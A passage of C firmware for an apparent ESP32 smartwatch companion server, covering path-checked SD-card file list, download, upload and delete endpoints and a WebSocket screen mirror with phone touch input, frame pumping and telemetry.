        else                       { out[o++] = (char)c; }
    }
    out[o] = '\0';
}

/* GET /api/fs?p=<dir> snapshots the directory (via sdfs: claim plus a short lock), then streams the JSON in chunks with nothing held. */
static esp_err_t comp_fs_list_get(httpd_req_t *req)
{
    char path[NOCSIF_SDFS_PATH_MAX];
    if (!comp_query(req, "p", path, sizeof path)) snprintf(path, sizeof path, "%s", NOCSIF_SDFS_ROOT);
    if (!nocsif_sdfs_path_ok(path, true)) return comp_fs_err(req, "400 Bad Request", "bad path");

    nocsif_sdfs_ent_t *ents = heap_caps_calloc(NOCSIF_SDFS_LIST_MAX, sizeof *ents, MALLOC_CAP_SPIRAM);
    if (!ents) return comp_fs_err(req, "500 Internal Server Error", "out of memory");
    int  n = 0;
    bool trunc = false;
    const char *why = nocsif_sdfs_list(path, ents, NOCSIF_SDFS_LIST_MAX, &n, &trunc);
    if (why) {
        free(ents);
        return comp_fs_err(req, strcmp(why, "folder unavailable") == 0 ? "404 Not Found" : "503 Service Unavailable", why);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    char esc[NOCSIF_SDFS_PATH_MAX * 2];
    char line[NOCSIF_SDFS_PATH_MAX * 2 + 64];
    comp_json_escape(path, esc, sizeof esc);
    int len = snprintf(line, sizeof line, "{\"path\":\"%s\",\"ents\":[", esc);
    esp_err_t r = httpd_resp_send_chunk(req, line, len);
    for (int i = 0; i < n && r == ESP_OK; i++) {
        comp_json_escape(ents[i].name, esc, sizeof esc);
        len = snprintf(line, sizeof line, "%s{\"n\":\"%s\",\"d\":%d,\"s\":%u}",
                       i ? "," : "", esc, ents[i].is_dir ? 1 : 0, (unsigned)ents[i].size);
        r = httpd_resp_send_chunk(req, line, len);
    }
    if (r == ESP_OK) {
        len = snprintf(line, sizeof line, "],\"trunc\":%s}", trunc ? "true" : "false");
        r = httpd_resp_send_chunk(req, line, len);
    }
    if (r == ESP_OK) r = httpd_resp_send_chunk(req, NULL, 0);
    free(ents);
    return r;
}

/* GET /api/file?p=<file> streams the file 8 KB at a time, each read taking its own short card lock. */
static esp_err_t comp_fs_file_get(httpd_req_t *req)
{
    char path[NOCSIF_SDFS_PATH_MAX];
    if (!comp_query(req, "p", path, sizeof path) || !nocsif_sdfs_path_ok(path, false)) {
        return comp_fs_err(req, "400 Bad Request", "bad path");
    }
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);

    FILE *f = NULL;
    struct stat st = { 0 };
    if (nocsif_sdcard_lock(1500)) {
        if (stat(path, &st) == 0 && S_ISREG(st.st_mode)) f = fopen(path, "rb");
        nocsif_sdcard_unlock();
    }
    if (!f) { nocsif_usb_gadget_release_sd(); return comp_fs_err(req, "404 Not Found", "no such file"); }
    uint8_t *buf = heap_caps_malloc(COMP_FS_CHUNK, MALLOC_CAP_SPIRAM);
    if (!buf) {
        if (nocsif_sdcard_lock(1500)) { fclose(f); nocsif_sdcard_unlock(); } else { fclose(f); }
        nocsif_usb_gadget_release_sd();
        return comp_fs_err(req, "500 Internal Server Error", "out of memory");
    }

    /* Header values are referenced, not copied, by httpd until the first
     * chunk actually goes out, so they need to stay alive in this stack frame.
     * A '"' in a filename would break the header, but the client is the one
     * naming the download anyway. */
    const char *name = strrchr(path, '/');
    name = name ? name + 1 : path;
    char cd[NOCSIF_SDFS_NAME_MAX + 40], szs[24];
    snprintf(cd, sizeof cd, "attachment; filename=\"%s\"", name);
    for (char *q = cd + 22; *q; q++) if (*q == '"' && q[1] != '\0') *q = '_';
    snprintf(szs, sizeof szs, "%lu", (unsigned long)st.st_size);
    httpd_resp_set_type(req, nocsif_sdfs_mime(name));
    httpd_resp_set_hdr(req, "Content-Disposition", cd);
    httpd_resp_set_hdr(req, "X-File-Size", szs);
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    ESP_LOGI(TAG, "companion fs: GET %s (%lu bytes)", path, (unsigned long)st.st_size);

    esp_err_t r = ESP_OK;
    size_t sent = 0;
    for (;;) {
        if (!nocsif_sdcard_lock(3000)) { r = ESP_FAIL; break; }
        size_t n = fread(buf, 1, COMP_FS_CHUNK, f);
        nocsif_sdcard_unlock();
        if (n == 0) break;
        r = httpd_resp_send_chunk(req, (const char *)buf, n);
        if (r != ESP_OK) break;
        sent += n;
    }
    if (nocsif_sdcard_lock(3000)) { fclose(f); nocsif_sdcard_unlock(); } else { fclose(f); }
    heap_caps_free(buf);
    nocsif_usb_gadget_release_sd();
    if (r == ESP_OK) r = httpd_resp_send_chunk(req, NULL, 0);
    ESP_LOGI(TAG, "companion fs: sent %u/%lu bytes%s", (unsigned)sent, (unsigned long)st.st_size,
             r == ESP_OK ? "" : " (aborted)");
    return r;
}

/* POST /api/upload?p=<dir>&n=<name>: the raw body becomes <dir>/<name>,
 * written to <name>.part in 8 KB pieces (each under its own short lock),
 * then renamed over any existing file. On a failure, the rest of the body
 * is drained here in large reads — otherwise httpd would purge it 32 bytes
 * at a time — so the browser still receives the actual failure reason. */
static esp_err_t comp_fs_upload_post(httpd_req_t *req)
{
    char dir[NOCSIF_SDFS_PATH_MAX], name[NOCSIF_SDFS_NAME_MAX];
    if (!comp_query(req, "p", dir, sizeof dir) || !nocsif_sdfs_path_ok(dir, true)) {
        return comp_fs_err(req, "400 Bad Request", "bad folder");
    }
    if (!comp_query(req, "n", name, sizeof name) || !nocsif_sdfs_name_ok(name)) {
        return comp_fs_err(req, "400 Bad Request", "bad file name");
    }
    char path[NOCSIF_SDFS_PATH_MAX + NOCSIF_SDFS_NAME_MAX + 2];
    char part[sizeof path + 8];
    if (snprintf(path, sizeof path, "%s/%s", dir, name) >= NOCSIF_SDFS_PATH_MAX) {
        return comp_fs_err(req, "400 Bad Request", "path too long");
    }
    snprintf(part, sizeof part, "%s.part", path);
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);

    FILE *f = NULL;
    if (nocsif_sdcard_lock(1500)) { f = fopen(part, "wb"); nocsif_sdcard_unlock(); }
    if (!f) { nocsif_usb_gadget_release_sd(); return comp_fs_err(req, "500 Internal Server Error", "cannot write to the card"); }
    uint8_t *buf = heap_caps_malloc(COMP_FS_CHUNK, MALLOC_CAP_SPIRAM);
    const char *err = buf ? NULL : "out of memory";
    size_t total = req->content_len, got = 0;
    int timeouts = 0;
    while (!err && got < total) {
        size_t want = total - got;
        if (want > COMP_FS_CHUNK) want = COMP_FS_CHUNK;
        int r = httpd_req_recv(req, (char *)buf, want);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) { if (++timeouts > 6) err = "upload stalled"; continue; }
        if (r <= 0) { err = "connection dropped"; break; }
        timeouts = 0;
        if (!nocsif_sdcard_lock(3000)) { err = "card busy"; break; }
        size_t w = fwrite(buf, 1, (size_t)r, f);
        nocsif_sdcard_unlock();
        if (w != (size_t)r) { err = "card write failed (full?)"; break; }
        got += (size_t)r;
    }
    if (err && buf && got < total) {                          /* drains the body so the client still sees the failure reason */
        int spins = 0;
        while (got < total && spins < 200) {
            size_t want = total - got;
            if (want > COMP_FS_CHUNK) want = COMP_FS_CHUNK;
            int r = httpd_req_recv(req, (char *)buf, want);
            if (r == HTTPD_SOCK_ERR_TIMEOUT) { spins++; continue; }
            if (r <= 0) break;
            got += (size_t)r;
        }
    }
    if (buf) heap_caps_free(buf);
    if (nocsif_sdcard_lock(3000)) {
        fclose(f);
        if (!err) {
            remove(path);
            if (rename(part, path) != 0) err = "cannot replace the file";
        }
        if (err) remove(part);
        nocsif_sdcard_unlock();
    } else {
        fclose(f);
        if (!err) err = "card busy";
    }
    nocsif_usb_gadget_release_sd();
    ESP_LOGI(TAG, "companion fs: upload %s %u/%u bytes%s%s", path, (unsigned)got, (unsigned)total,
             err ? " FAILED: " : "", err ? err : "");
    if (err) return comp_fs_err(req, "500 Internal Server Error", err);
    char js[64];
    snprintf(js, sizeof js, "{\"ok\":true,\"size\":%u}", (unsigned)got);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return httpd_resp_sendstr(req, js);
}

/* POST /api/delete {"p":"/sd/..."} removes exactly one regular file;
 * directories are refused, since there's no recursive delete from a phone.
 * The body/path buffers are wider than the jail's length cap, so an
 * over-long path is rejected outright, never silently truncated onto a
 * different file. */
static esp_err_t comp_fs_delete_post(httpd_req_t *req)
{
    char body[NOCSIF_SDFS_PATH_MAX + 48], path[NOCSIF_SDFS_PATH_MAX + 48];
    comp_read_body(req, body, sizeof body);
    if (!comp_json_str(body, "p", path, sizeof path) || !nocsif_sdfs_path_ok(path, false)) {
        return comp_fs_err(req, "400 Bad Request", "bad path");
    }
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);
    const char *err = NULL, *status = "400 Bad Request";
    if (nocsif_sdcard_lock(1500)) {
        struct stat st;
        if (stat(path, &st) != 0)          { err = "no such file"; status = "404 Not Found"; }
        else if (!S_ISREG(st.st_mode))     { err = "folders can't be deleted here"; }
        else if (remove(path) != 0)        { err = "delete failed"; status = "500 Internal Server Error"; }
        nocsif_sdcard_unlock();
    } else {
        err = "card busy"; status = "503 Service Unavailable";
    }
    nocsif_usb_gadget_release_sd();
    ESP_LOGI(TAG, "companion fs: delete %s%s%s", path, err ? " FAILED: " : "", err ? err : "");
    if (err) return comp_fs_err(req, status, err);
    return comp_reply(req, true);
}

/* ---- /ws client table (the httpd task adds / removes on the WS handshake / close; the mirror task reads
 * it under the same spinlock while it sends) ---------------------------------------------------------- */
static void mir_kick(void);   /* fwd: wake the mirror task */

static void ws_add_fd(int fd)
{
    if (!s_ws_tx) return;                                   /* httpd not up */
    int old_fd = 0, slot = -1;
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i] == fd) { taskEXIT_CRITICAL(&s_ws_mux); return; }
    for (int i = 0; i < COMP_WS_MAX && slot < 0; i++) if (s_ws_fds[i] == 0) slot = i;
    if (slot < 0) { slot = 0; old_fd = s_ws_fds[0]; }       /* table full — recycle the oldest so a fresh client always connects */
    uint32_t gen = s_ws_tx[slot].gen + 1;
    memset(&s_ws_tx[slot], 0, sizeof s_ws_tx[slot]);
    s_ws_tx[slot].gen       = gen;
    s_ws_tx[slot].buf       = -1;
    s_ws_tx[slot].need_full = true;                         /* a new viewer starts from a whole screen */
    s_ws_fds[slot] = fd;
    taskEXIT_CRITICAL(&s_ws_mux);
    if (old_fd && s_comp_httpd) httpd_sess_trigger_close(s_comp_httpd, old_fd);
    mir_kick();
}
static void ws_del_fd(int fd)
{
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; i < COMP_WS_MAX; i++) {
        if (s_ws_fds[i] == fd) {
            s_ws_fds[i] = 0;
            if (s_ws_tx) {
                uint32_t gen = s_ws_tx[i].gen + 1;
                memset(&s_ws_tx[i], 0, sizeof s_ws_tx[i]);
                s_ws_tx[i].gen = gen;
                s_ws_tx[i].buf = -1;
            }
            break;
        }
    }
    taskEXIT_CRITICAL(&s_ws_mux);
}

int nocsif_wifi_companion_ws_clients(void)
{
    int n = 0;
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i]) n++;
    return n;
}

static esp_err_t comp_ws_handler(httpd_req_t *req)
{
    if (req->method == HTTP_GET) {                 /* handshake done → track this socket for pushes */
        int fd = httpd_req_to_sockfd(req);
        ws_add_fd(fd);
        /* Mirror QoS (internet-sharing): mark this socket's TX at a high WMM access category so the
         * watch→phone mirror frames beat best-effort forwarded internet in the SoftAP's TX queues. With
         * sharing on, a bulk internet downlink otherwise starves the interactive mirror — the picture on
         * the phone lags badly even though the watch itself responds to the touch uplink promptly (the
         * frames just can't get airtime). NAPT preserves the internet packets' own DSCP (best-effort), so
         * elevating only this socket makes the mirror win. DSCP CS5 (0xA0) → TID 5 → AC_VI (video) in the
         * WiFi driver's DSCP→AC map; AC_VI beats AC_BE without the strict-airtime penalties of AC_VO. */
        int tos = s_mir_tos;                       /* bridge knob `gw mirror tos=N` (A/B of the WMM mark) */
        if (tos) setsockopt(fd, IPPROTO_IP, IP_TOS, &tos, sizeof tos);
        /* Nagle off: a frame's last, partial segment otherwise waits until every earlier segment is ACKed —
         * behind the phone's delayed ACK that is tens to hundreds of ms on EVERY frame (httpd itself only
         * turns TCP_NODELAY on around its error replies). Frames are written whole, so no tinygrams. */
        int nodelay = s_mir_nodelay;               /* bridge knob `gw mirror nodelay=0|1` (A/B, next viewer) */
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof nodelay);
        return ESP_OK;
    }
    /* Interactive uplink, phone to watch: small JSON control messages on
     * the same socket.
     *   {"t":"m","x":..,"y":..,"s":0/1}  a touch move or press-state change (watch-space pixels)
     *   {"t":"b","k":"fn"|"pwr","a":"s"|"l"}  a side-button press (short or long)
     *   {"t":"c","on":0/1}  casting toggle (blanks the watch, phone becomes the display) */
    uint8_t buf[128];
    httpd_ws_frame_t f = { .type = HTTPD_WS_TYPE_TEXT, .payload = buf };
    if (httpd_ws_recv_frame(req, &f, sizeof buf - 1) != ESP_OK) {
        /* The peer reset or closed the socket — Safari backgrounding, a page
         * navigation, a download hand-off. Returning ESP_OK here used to make
         * httpd keep re-polling the dead socket in a tight loop (recv errno 104
         * then 128, about 3 log lines per millisecond, pinning CPU 1) until the
         * task watchdog fired on the starved IDLE task — this was the 2026-09-08
         * reset and the "everything lags" report. Failing the request instead
         * makes httpd close the session, so the page's ws.onclose fires and it
         * reconnects. */
        ws_del_fd(httpd_req_to_sockfd(req));
        return ESP_FAIL;
    }
    if (f.len > 0 && f.type == HTTPD_WS_TYPE_TEXT) {
        buf[f.len] = '\0';
        cJSON *root = cJSON_Parse((const char *)buf);
        if (root) {
            cJSON *t = cJSON_GetObjectItem(root, "t");
            char kind = (cJSON_IsString(t) && t->valuestring) ? t->valuestring[0] : 0;
            if (kind == 'm' && s_comp_touch_fn) {
                cJSON *x = cJSON_GetObjectItem(root, "x");
                cJSON *y = cJSON_GetObjectItem(root, "y");
                cJSON *s = cJSON_GetObjectItem(root, "s");
                const int pressed = cJSON_IsNumber(s) ? (int)s->valuedouble : 0;
                s_mir_input_us = esp_timer_get_time();
                /* A dark panel swallows touches (the indev waits for a double tap), so a phone tap on a sleeping
                 * watch did nothing until the owner found the drawer's "Wake watch" (2026-10-13: the first tap
                 * took 4 s and two power presses). Wake on the press instead and swallow that touch. */
                static bool s_wake_swallow;
                if (nocsif_display_is_asleep()) {
                    if (pressed && !s_wake_swallow) { s_wake_swallow = true; comp_dispatch(NOCSIF_COMPANION_CMD_WAKE, ""); }
                    if (!pressed) s_wake_swallow = false;
                } else {
                    s_wake_swallow = false;
                    s_comp_touch_fn(cJSON_IsNumber(x) ? (int)x->valuedouble : 0,
                                    cJSON_IsNumber(y) ? (int)y->valuedouble : 0, pressed);
                }
            } else if (kind == 'b') {
                s_mir_input_us = esp_timer_get_time();
                cJSON *k = cJSON_GetObjectItem(root, "k");
                cJSON *a = cJSON_GetObjectItem(root, "a");
                const char *ks = (cJSON_IsString(k) && k->valuestring) ? k->valuestring : "";
                bool lng = (cJSON_IsString(a) && a->valuestring && a->valuestring[0] == 'l');
                char arg[12];
                snprintf(arg, sizeof arg, "%s.%s", (ks[0] == 'p') ? "pwr" : "fn", lng ? "long" : "short");
                comp_dispatch(NOCSIF_COMPANION_CMD_BUTTON, arg);
            } else if (kind == 'c') {
                cJSON *on = cJSON_GetObjectItem(root, "on");
                comp_dispatch(NOCSIF_COMPANION_CMD_CAST,
                              (cJSON_IsNumber(on) && on->valuedouble != 0) ? "1" : "0");
            } else if (kind == 'k') {                 /* page keepalive: uplink traffic keeps the phone's radio awake */
            } else if (kind == 'w') {                 /* hamburger: wake the watch screen */
                comp_dispatch(NOCSIF_COMPANION_CMD_WAKE, "");
            } else if (kind == 'r') {                 /* hamburger: reboot the watch */
                comp_dispatch(NOCSIF_COMPANION_CMD_RESET, "");
            }
            cJSON_Delete(root);
        }
    }
    if (f.type == HTTPD_WS_TYPE_CLOSE) ws_del_fd(httpd_req_to_sockfd(req));
    return ESP_OK;
}

/* A client's stream is unusable (stalled mid-frame / reset by the peer): drop it from the table AND close
 * the session so the page's ws.onclose fires and it reconnects cleanly (before, only the table entry was
 * dropped: the page kept a silent zombie socket and never reconnected). Safe from the mirror task —
 * httpd_sess_trigger_close goes through the server's control socket. */
static void ws_drop(httpd_handle_t hd, int fd)
{
    ws_del_fd(fd);
    if (hd) httpd_sess_trigger_close(hd, fd);
}

/* WS frame header, unmasked (server → client): FIN + opcode (0x81 text / 0x82 binary), then the
 * 7/16/64-bit length. */
static size_t ws_hdr(uint8_t *h, uint8_t fin_op, size_t len)
{
    h[0] = fin_op;
    if (len < 126)        { h[1] = (uint8_t)len; return 2; }
    if (len < 65536)      { h[1] = 126; h[2] = (uint8_t)(len >> 8); h[3] = (uint8_t)len; return 4; }
    h[1] = 127;
    for (int i = 0; i < 8; i++) h[2 + i] = (uint8_t)(((uint64_t)len) >> (56 - 8 * i));
    return 10;
}

static void mir_kick(void)
{
    if (s_mir_task) xTaskNotifyGive(s_mir_task);
}

/* A hotspot viewer frozen mid-frame while the radio stops answering is the 2026-10-13 phone report: the page
 * sat on a stuck picture and a reload did not help, because every transmit buffer of the (lean, 2+4) pool was
 * held by frames queued for the phone's station, so nothing else — not even the uplink router echo — got out.
 * Removing the station frees its queue; the phone re-associates by itself within a second or two. */
#define MIR_FLUSH_US       (5 * 1000 * 1000)

/* True when fd's peer is a station of the watch's own SoftAP (its subnet), not a LAN host on the uplink. */
static bool fd_is_ap_peer(int fd)
{
    struct sockaddr_in pa;
    socklen_t pl = sizeof pa;
    if (getpeername(fd, (struct sockaddr *)&pa, &pl) != 0) return false;
    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    esp_netif_ip_info_t ii;
    if (!ap || esp_netif_get_ip_info(ap, &ii) != ESP_OK || ii.ip.addr == 0) return false;
    return (pa.sin_addr.s_addr & ii.netmask.addr) == (ii.ip.addr & ii.netmask.addr);
}

static void mir_ap_flush(int fd, int stalled_s)
{
    static int64_t s_last_us;
    const int64_t now = esp_timer_get_time();
    if (now - s_last_us < 20 * 1000000LL || !fd_is_ap_peer(fd)) return;
    s_last_us = now;
    wifi_sta_list_t sl;
    char who[96];
    int o = 0;
    who[0] = '\0';
    if (esp_wifi_ap_get_sta_list(&sl) == ESP_OK) {
        for (int i = 0; i < sl.num && o < (int)sizeof who - 24; i++)
            o += snprintf(who + o, sizeof who - (size_t)o, " %02x:%02x:%02x rssi %d", sl.sta[i].mac[3], sl.sta[i].mac[4], sl.sta[i].mac[5], sl.sta[i].rssi);
    }
    ESP_LOGW(TAG, "mirror: hotspot viewer frozen %d s — driver statistics follow, then the AP's stations are removed (they re-join):%s",
             stalled_s, who);
    esp_wifi_statis_dump(WIFI_STATIS_BUFFER | WIFI_STATIS_RXTX | WIFI_STATIS_PS);
    esp_wifi_deauth_sta(0);                       /* aid 0 = every station */
    s_mir_st.flushes++;
}

/* WebSocket viewers whose peer is a station of the watch's own hotspot (not a LAN host on the uplink): the Governor
 * parks the router link while a phone drives the watch over the hotspot (governor.c phone_park_tick). */
int nocsif_wifi_companion_ap_viewers(void)
{
    int fds[COMP_WS_MAX], n = 0;
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; i < COMP_WS_MAX; i++) if (s_ws_fds[i]) fds[n++] = s_ws_fds[i];
    taskEXIT_CRITICAL(&s_ws_mux);
    int ap = 0;
    for (int i = 0; i < n; i++) if (fd_is_ap_peer(fds[i])) ap++;
    return ap;
}

/* Push as much of slot i's in-flight frame as the socket takes right now (never blocks). Mirror task only.
 * The cursor is read and written back under the spinlock, guarded by the slot generation, so a client
 * that was dropped and replaced mid-send never receives the tail of someone else's frame.
 * Returns 1 while bytes remain, 0 when idle / complete, -1 when the client was dropped. */
static int ws_tx_pump(int i)
{
    if (!s_ws_tx) return 0;
    ws_tx_t *t = &s_ws_tx[i];
    uint8_t hdr[sizeof t->hdr];
    taskENTER_CRITICAL(&s_ws_mux);
    const int fd = s_ws_fds[i];
    const uint32_t gen = t->gen;
    size_t off = t->off;
    const size_t total = t->total, hdr_len = t->hdr_len;
    const uint8_t *payload = t->payload;
    const int64_t t_progress = t->t_progress, t_start = t->t_start;
    const int buf = t->buf;
    memcpy(hdr, t->hdr, sizeof hdr);                     /* a local copy: the slot may be recycled mid-send */
    taskEXIT_CRITICAL(&s_ws_mux);
    if (fd == 0 || total == 0) return 0;

    const int64_t now = esp_timer_get_time();
    bool moved = false;
    int rc = 0;
    while (off < total) {
        const uint8_t *p; size_t n;
        if (off < hdr_len) { p = hdr + off;                 n = hdr_len - off; }
        else               { p = payload + (off - hdr_len); n = total - off; }
        if (s_mir_txb > 0) {                                 /* write budget left this round (bridge knob txb=) */
            if (s_txb_left[i] <= 0) { rc = 1; break; }
            if (n > (size_t)s_txb_left[i]) n = (size_t)s_txb_left[i];
        }
        int w = send(fd, p, n, MSG_DONTWAIT);
        if (w > 0) { off += (size_t)w; moved = true; if (s_mir_txb > 0) s_txb_left[i] -= w; continue; }
        if (w < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) { rc = 1; break; }   /* socket full: resume next round */
        rc = -1; break;                                                               /* reset / closed by the peer */
    }
    bool done = false, stalled = false, suspect = false, flush = false, was_frame = false;
    taskENTER_CRITICAL(&s_ws_mux);
    if (s_ws_fds[i] == fd && t->gen == gen) {
        if (moved) { t->off = off; t->t_progress = now; }
        if (rc == 1 && !moved && now - t_progress > WS_TX_STALL_US) stalled = true;
        else if (rc == 1 && !moved && now - t_progress > MIR_SUSPECT_US) { suspect = true; flush = (now - t_progress > MIR_FLUSH_US); }
        if (rc == 0 && off >= total) {
            done = true; was_frame = (buf >= 0);
            if (buf >= 0) t->last_seq = t->buf_seq;
            t->total = 0; t->off = 0; t->buf = -1; t->payload = NULL;
            if (was_frame) {   /* per-client send-rate EMA (KB/s) from this frame */
                const int64_t dt = now - t_start;
                if (dt > 0 && total > 2048) {
                    uint32_t kbps = (uint32_t)((uint64_t)total * 1000000ull / 1024ull / (uint64_t)dt);
                    t->kbps = t->kbps ? (t->kbps * 3 + kbps) / 4 : kbps;
                }
            }
        }
    } else {
        rc = 0;                                                                        /* slot changed under us: forget it */
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    if (moved || done) s_mir_progress_us = now;
    if (suspect) {                                   /* 3 s with a frame stuck: ask the link check to test the router NOW (the
                                                      * stall drop comes at 8 s); one echo, harmless when the link is fine */
        static int64_t s_last_suspect_us;
        if (now - s_last_suspect_us > 6 * 1000000LL) { s_last_suspect_us = now; nocsif_wifi_link_check_kick(); }
    }
    if (flush) mir_ap_flush(fd, (int)((now - t_progress) / 1000000));
    if (rc == -1 || stalled) {
        if (stalled) {
            s_mir_st.stalls++;
            ESP_LOGW(TAG, "mirror: viewer stalled %d s mid-frame (%u/%u B) — dropped",
                     (int)((now - t_progress) / 1000000), (unsigned)off, (unsigned)total);
            nocsif_wifi_link_check_kick();            /* a dead station link looks exactly like this: check it now */
        }
        ws_drop(s_comp_httpd, fd);
        return -1;
    }
    if (done && was_frame && nocsif_ui_rlat_mark(NOCSIF_RL_SENT)) {
        /* Tap-to-picture probe: a remote release went RX -> LVGL read -> flush -> capture -> take -> encode ->
         * sent. Each stage as ms after the release reached the watch (bridge `gw mirror` rl_*). */
        int64_t t[NOCSIF_RL_N];
        nocsif_ui_rlat_get(t);
        uint32_t ms[NOCSIF_RL_N];
        for (int k = 0; k < NOCSIF_RL_N; k++) ms[k] = (t[k] && t[k] >= t[NOCSIF_RL_RX]) ? (uint32_t)((t[k] - t[NOCSIF_RL_RX]) / 1000) : 0;
        s_mir_st.rl_read = ms[NOCSIF_RL_READ]; s_mir_st.rl_flush = ms[NOCSIF_RL_FLUSH]; s_mir_st.rl_cap = ms[NOCSIF_RL_CAP];
        s_mir_st.rl_take = ms[NOCSIF_RL_TAKE]; s_mir_st.rl_enc = ms[NOCSIF_RL_ENC];   s_mir_st.rl_sent = ms[NOCSIF_RL_SENT];
        ESP_LOGI(TAG, "mirror: tap->picture read +%u, flush +%u, capture +%u, take +%u, encoded +%u, sent +%u ms",
                 (unsigned)ms[1], (unsigned)ms[2], (unsigned)ms[3], (unsigned)ms[4], (unsigned)ms[5], (unsigned)ms[6]);
    }
    if (done) {
        static int64_t s_last_slow_log;
        const uint32_t ms = (uint32_t)((now - t_start) / 1000);
        if (was_frame && ms > 1000 && now - s_last_slow_log > 5 * 1000000) {
            s_last_slow_log = now;
            ESP_LOGW(TAG, "mirror: slow frame — %u B took %u ms to send (link stall, connection kept)",
                     (unsigned)total, ms);
        }
    }
    return rc;
}

static void mir_pump_all(void)
{
    for (int i = 0; i < COMP_WS_MAX; i++) ws_tx_pump(i);
}

/* Start the newest applicable ready frame on every idle client. A client that cannot apply any newer
 * frame (it would leave a gap) is marked for a keyframe, which the next encode produces. */
static void mir_start_idle(void)
{
    const int64_t now = esp_timer_get_time();
    taskENTER_CRITICAL(&s_ws_mux);
    for (int i = 0; i < COMP_WS_MAX; i++) {
        ws_tx_t *t = &s_ws_tx[i];
        if (s_ws_fds[i] == 0 || t->total != 0) continue;
        int best = -1; bool newer = false;
        for (int b = 0; b < MIR_BUFS; b++) {
            const mir_buf_t *m = &s_mb[b];
            if (m->len <= 0 || m->seq <= t->last_seq) continue;
            newer = true;
            if (t->need_full && m->from != 0) continue;              /* waiting for a keyframe */
            if (m->from != 0 && t->last_seq < m->from) continue;     /* would leave a gap → stale patches */
            if (best < 0 || m->seq > s_mb[best].seq) best = b;
        }
        if (best < 0) { if (newer) t->need_full = true; continue; }
        const mir_buf_t *m = &s_mb[best];
        t->hdr_len = ws_hdr(t->hdr, 0x82, (size_t)m->len);
        t->payload = m->data + m->off; t->off = 0; t->total = t->hdr_len + (size_t)m->len;
        t->buf = best; t->buf_seq = m->seq;
        t->t_start = t->t_progress = now;
        if (m->from == 0) t->need_full = false;
    }
    taskEXIT_CRITICAL(&s_ws_mux);
}

/* Pick the frame buffer the next encode may overwrite: an empty one, else one every connected client has
 * delivered, else one no client is mid-send on but some client still needs (→ its rectangles are unioned
 * into the new frame). -1 = both buffers are mid-send (bounded by the stall timeout). */
static int mir_pick_buf(bool *need_union)
{
    int empty = -1, sent = -1, unsent = -1;
    *need_union = false;
    taskENTER_CRITICAL(&s_ws_mux);
    for (int b = 0; b < MIR_BUFS; b++) {
        const mir_buf_t *m = &s_mb[b];
        bool busy = false, pending = false;
        for (int i = 0; i < COMP_WS_MAX; i++) {
            if (s_ws_fds[i] == 0) continue;
            const ws_tx_t *t = &s_ws_tx[i];
            if (t->total != 0 && t->buf == b) busy = true;
            /* a client mid-send on another frame will reach that frame's seq next: judge from there, so
             * the frame it needs right after is kept (unioned), not silently overwritten */
            const uint32_t pos = (t->total != 0 && t->buf >= 0) ? t->buf_seq : t->last_seq;
            if (m->len > 0 && !t->need_full && pos < m->seq && pos >= m->from) pending = true;
        }
        if (busy) continue;
        if (m->len <= 0)  { if (empty < 0) empty = b; }
        else if (!pending){ if (sent < 0 || m->seq < s_mb[sent].seq) sent = b; }
        else              { if (unsent < 0 || m->seq < s_mb[unsent].seq) unsent = b; }
    }
    taskEXIT_CRITICAL(&s_ws_mux);
    if (empty >= 0) return empty;
    if (sent >= 0)  return sent;
    if (unsent >= 0) { *need_union = true; return unsent; }
    return -1;
}

/* Union rect r into the list (grow a rect it touches within 8 px, else a free slot, else the rect whose
 * area grows least). Returns the list length. */
static int mir_rect_union(int rects[][4], int n, const int r[4])
{
    int best = -1; long best_grow = 0;
    for (int i = 0; i < n; i++) {
        int *q = rects[i];
        if (r[0] <= q[2] + 8 && r[2] >= q[0] - 8 && r[1] <= q[3] + 8 && r[3] >= q[1] - 8) { best = i; best_grow = -1; break; }
        long nx0 = r[0] < q[0] ? r[0] : q[0], ny0 = r[1] < q[1] ? r[1] : q[1];
        long nx1 = r[2] > q[2] ? r[2] : q[2], ny1 = r[3] > q[3] ? r[3] : q[3];
        long grow = (nx1 - nx0 + 1) * (ny1 - ny0 + 1) - (long)(q[2] - q[0] + 1) * (q[3] - q[1] + 1);
        if (best < 0 || grow < best_grow) { best = i; best_grow = grow; }
    }
    if (best_grow >= 0 && n < MIR_RECTS) { memcpy(rects[n], r, 4 * sizeof(int)); return n + 1; }
    if (best < 0) { memcpy(rects[0], r, 4 * sizeof(int)); return 1; }
    int *q = rects[best];
    if (r[0] < q[0]) q[0] = r[0];
    if (r[1] < q[1]) q[1] = r[1];
    if (r[2] > q[2]) q[2] = r[2];
    if (r[3] > q[3]) q[3] = r[3];
    return n;
}

/* Telemetry: a window of 64 frames (or 5 s) → avg / worst encode, bytes, rects, encoded area, fps. */
static void mir_telemetry(int64_t t0, uint32_t bytes, uint32_t area, int parts, uint32_t from, int fw, int fh)
{
    const int64_t now = esp_timer_get_time();
    const uint32_t us = (uint32_t)(now - t0);
    if (s_mir_win_t0 == 0) s_mir_win_t0 = now;
    s_mir_win_frames++; s_mir_win_us += us; s_mir_win_bytes += bytes; s_mir_win_area += area; s_mir_win_rects += (uint32_t)parts;
    if (us > s_mir_win_max_us) s_mir_win_max_us = us;
    s_mir_st.frames++;
    if (s_mir_st.frames <= 3) ESP_LOGI(TAG, "mirror: frame %u — %s, %d part(s), %u B, %u px, encode %u ms%s",
                                       (unsigned)s_mir_st.frames, s_mir_codec ? "NQ" : "JPEG", parts, (unsigned)bytes,
                                       (unsigned)area, us / 1000, from == 0 ? " (keyframe)" : "");
    if (s_mir_win_frames >= 64 || now - s_mir_win_t0 > 5000000) {
